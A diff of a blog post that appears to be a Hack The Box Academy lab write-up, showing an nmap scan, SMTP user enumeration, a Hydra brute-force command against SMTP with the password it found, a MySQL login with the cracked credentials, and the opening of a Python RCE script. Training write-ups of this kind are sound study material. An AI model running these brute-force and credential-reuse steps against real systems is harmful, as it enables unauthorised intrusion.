@@ -3,17 +3,17 @@ title: "HTB Academy | Attacking Common Services lab 1"
 description: "This is a easy lab writeup from the htb module attacking common services"
 pubDate: "Nov 15 2024"
 heroImage: "https://academy.hackthebox.com/storage/modules/116/logo.png?t=1730242916"
-badge: "Easy"
+badge: "Windows - Easy"
 tags: ["smtp", "bruteforcing", "information-leakage","Windows","MySql","RCE","XAMPP","Revershe Shell"]
 ---
 
-- 1. Nmap scan:
+- 1. Nmap Open TCP Ports scan:
 
 ```sh
 sudo nmap -sS -p- --open --min-rate -Pn -n -vvv $target -oG allports
 ```
 
-- 2. Nmap scripts and services
+- 2. Nmap basic scripts and services scan:
 
 ```sh
 nmap -sCV -p $Ports $target -oN targeted
@@ -110,7 +110,7 @@ Target TCP port .......... 25
 Query timeout ............ 5 secs
 Target domain ............ inlanefreight.htb
 
-10.129.153.88: fiona@inlanefreight.htb exists
+10.129.153.88: f************** exists
 
 1 results.
 
@@ -120,21 +120,21 @@ Target domain ............ inlanefreight.htb
 - 4. Hydra password spraying 
 
 ```sh
-❯ hydra -l fiona@inlanefreight.htb -P /usr/share/wordlists/rockyou.txt smtp://10.129.153.88
+❯ hydra -l f*************** -P /usr/share/wordlists/rockyou.txt smtp://10.129.153.88
 Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
 Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-11-21 17:14:48
 [INFO] several providers have implemented cracking protection, check with a small wordlist first - and stay legal!
 [DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
 [DATA] attacking smtp://10.129.153.88:25/
-[25][smtp] host: 10.129.153.88   login: fiona@inlanefreight.htb   password: 987654321
+[25][smtp] host: 10.129.153.88   login: f*************   password: 9***********
 1 of 1 target successfully completed, 1 valid password found
 ```
 
 - 5. Testing credentials on Mysql service:
 
 ```sh
-❯ mysql -u fiona -p987654321 -h 10.129.153.88 --ssl=0
+❯ mysql -u f**** -p9******** -h 10.129.153.88 --ssl=0
 Welcome to the MariaDB monitor.  Commands end with ; or \g.
 Your MariaDB connection id is 10
 Server version: 10.4.24-MariaDB mariadb.org binary distribution
@@ -176,7 +176,7 @@ MariaDB [(none)]>
 
 ![alt text](/4.png)
 
-- 10. Python script to execute RCE and getting the shell:
+- 10. Python script to execute RCE and getting the shell, you cand download the script from my [Github](https://github.com/b4dScript/pseudo-RCE):
 
 ```python
 import requests
